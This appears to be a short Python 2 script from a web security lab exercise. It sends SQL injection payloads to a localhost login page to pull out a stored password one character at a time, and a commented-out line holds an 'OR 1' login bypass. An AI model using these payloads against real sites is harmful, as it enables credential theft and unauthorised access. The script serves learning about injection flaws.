import subprocess
import urllib


# request = "http://localhost/lab09/login.php?u=\" OR id = 98 AND SUBSTRING(password,1,1) = '1' -- " 
request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20SUBSTRING(password,1,1)%20=%20%271%27%20--%20" 
# request = "http://localhost/lab09/login.php?u=\"%20OR%201%20--%20 " 
#bashCommand = "echo 'hello' "
# subprocess.call(['wget','-q','-O','index.html',request])
#output, error = process.communicate()
#print output
#print error
#print bashCommand

f = urllib.urlopen(request)
print "1" + f.geturl()
print "2" + f.read()